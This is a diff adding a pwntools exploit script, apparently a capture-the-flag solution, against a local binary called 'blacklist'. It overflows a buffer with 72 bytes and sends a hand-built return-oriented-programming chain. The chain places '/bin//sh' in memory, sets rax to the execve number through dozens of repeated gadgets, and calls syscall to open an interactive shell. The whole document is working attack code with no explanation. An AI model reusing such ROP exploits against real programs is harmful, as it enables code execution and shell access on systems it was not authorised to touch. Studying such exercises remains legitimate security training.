@@ -1,0 +1,86 @@
+from pwn import *
+
+io = process('./blacklist')
+elf = ELF('./blacklist')
+print(hex(elf.bss()))
+payload = b'A'*72
+payload += p64(0x00000000004028b8) # pop rsi ; ret
+payload += p64(elf.bss()) # @ .data
+payload += p64(0x0000000000414e53) # pop rax ; ret
+payload += b'/bin//sh'
+payload += p64(0x000000000048ab05) # mov qword ptr [rsi], rax ; ret
+payload += p64(0x00000000004028b8) # pop rsi ; ret
+payload += p64(elf.bss()+8) # @ .data + 8
+payload += p64(0x0000000000452af0) # xor rax, rax ; ret
+payload += p64(0x000000000048ab05) # mov qword ptr [rsi], rax ; ret
+payload += p64(0x00000000004018ca) # pop rdi ; ret
+payload += p64(elf.bss()) # @ .data
+payload += p64(0x00000000004028b8) # pop rsi ; ret
+payload += p64(elf.bss()+8) # @ .data + 8
+payload += p64(0x00000000004017cf) # pop rdx ; ret
+payload += p64(elf.bss()+8) # @ .data + 8
+payload += p64(0x0000000000452af0) # xor rax, rax ; ret
+payload += p64(0x000000000047fb30) # add rax, 1 ; ret
+payload += p64(0x000000000047fb30) # add rax, 1 ; ret
+payload += p64(0x000000000047fb30) # add rax, 1 ; ret
+payload += p64(0x000000000047fb30) # add rax, 1 ; ret
+payload += p64(0x000000000047fb30) # add rax, 1 ; ret
+payload += p64(0x000000000047fb30) # add rax, 1 ; ret
+payload += p64(0x000000000047fb30) # add rax, 1 ; ret
+payload += p64(0x000000000047fb30) # add rax, 1 ; ret
+payload += p64(0x000000000047fb30) # add rax, 1 ; ret
+payload += p64(0x000000000047fb30) # add rax, 1 ; ret
+payload += p64(0x000000000047fb30) # add rax, 1 ; ret
+payload += p64(0x000000000047fb30) # add rax, 1 ; ret
+payload += p64(0x000000000047fb30) # add rax, 1 ; ret
+payload += p64(0x000000000047fb30) # add rax, 1 ; ret
+payload += p64(0x000000000047fb30) # add rax, 1 ; ret
+payload += p64(0x000000000047fb30) # add rax, 1 ; ret
+payload += p64(0x000000000047fb30) # add rax, 1 ; ret
+payload += p64(0x000000000047fb30) # add rax, 1 ; ret
+payload += p64(0x000000000047fb30) # add rax, 1 ; ret
+payload += p64(0x000000000047fb30) # add rax, 1 ; ret
+payload += p64(0x000000000047fb30) # add rax, 1 ; ret
+payload += p64(0x000000000047fb30) # add rax, 1 ; ret
+payload += p64(0x000000000047fb30) # add rax, 1 ; ret
+payload += p64(0x000000000047fb30) # add rax, 1 ; ret
+payload += p64(0x000000000047fb30) # add rax, 1 ; ret
+payload += p64(0x000000000047fb30) # add rax, 1 ; ret
+payload += p64(0x000000000047fb30) # add rax, 1 ; ret
+payload += p64(0x000000000047fb30) # add rax, 1 ; ret
+payload += p64(0x000000000047fb30) # add rax, 1 ; ret
+payload += p64(0x000000000047fb30) # add rax, 1 ; ret
+payload += p64(0x000000000047fb30) # add rax, 1 ; ret
+payload += p64(0x000000000047fb30) # add rax, 1 ; ret
+payload += p64(0x000000000047fb30) # add rax, 1 ; ret
+payload += p64(0x000000000047fb30) # add rax, 1 ; ret
+payload += p64(0x000000000047fb30) # add rax, 1 ; ret
+payload += p64(0x000000000047fb30) # add rax, 1 ; ret
+payload += p64(0x000000000047fb30) # add rax, 1 ; ret
+payload += p64(0x000000000047fb30) # add rax, 1 ; ret
+payload += p64(0x000000000047fb30) # add rax, 1 ; ret
+payload += p64(0x000000000047fb30) # add rax, 1 ; ret
+payload += p64(0x000000000047fb30) # add rax, 1 ; ret
+payload += p64(0x000000000047fb30) # add rax, 1 ; ret
+payload += p64(0x000000000047fb30) # add rax, 1 ; ret
+payload += p64(0x000000000047fb30) # add rax, 1 ; ret
+payload += p64(0x000000000047fb30) # add rax, 1 ; ret
+payload += p64(0x000000000047fb30) # add rax, 1 ; ret
+payload += p64(0x000000000047fb30) # add rax, 1 ; ret
+payload += p64(0x000000000047fb30) # add rax, 1 ; ret
+payload += p64(0x000000000047fb30) # add rax, 1 ; ret
+payload += p64(0x000000000047fb30) # add rax, 1 ; ret
+payload += p64(0x000000000047fb30) # add rax, 1 ; ret
+payload += p64(0x000000000047fb30) # add rax, 1 ; ret
+payload += p64(0x000000000047fb30) # add rax, 1 ; ret
+payload += p64(0x000000000047fb30) # add rax, 1 ; ret
+payload += p64(0x000000000047fb30) # add rax, 1 ; ret
+payload += p64(0x000000000047fb30) # add rax, 1 ; ret
+payload += p64(0x000000000047fb30) # add rax, 1 ; ret
+payload += p64(0x000000000047fb30) # add rax, 1 ; ret
+payload += p64(0x000000000047fb30) # add rax, 1 ; ret
+payload += p64(0x00000000004012d3) # syscall
+
+pause()
+io.sendline(payload)
+io.interactive()
